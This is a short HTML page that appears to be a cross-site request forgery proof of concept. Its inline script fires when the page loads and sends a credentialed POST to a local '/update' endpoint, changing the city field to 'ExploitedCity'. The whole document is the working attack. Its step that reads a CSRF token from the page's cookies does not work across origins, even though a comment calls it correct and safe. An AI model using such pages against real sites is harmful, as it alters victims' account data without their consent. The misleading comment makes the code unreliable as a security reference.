<html>
  <body>
    <script>
      function submitRequest() {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://127.0.0.1:5000/update", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;

        // Extract CSRF token from cookie correctly and safely
        const cookies = document.cookie.split('; ').reduce((acc, pair) => {
          const [key, value] = pair.split('=');
          acc[key] = value;
          return acc;
        }, {});

        if (cookies['csrf_token']) {
          xhr.setRequestHeader("X-CSRF-Header", cookies['csrf_token']);
        }

        xhr.send("city=ExploitedCity");
      }

      submitRequest();
    </script>
  </body>
</html>
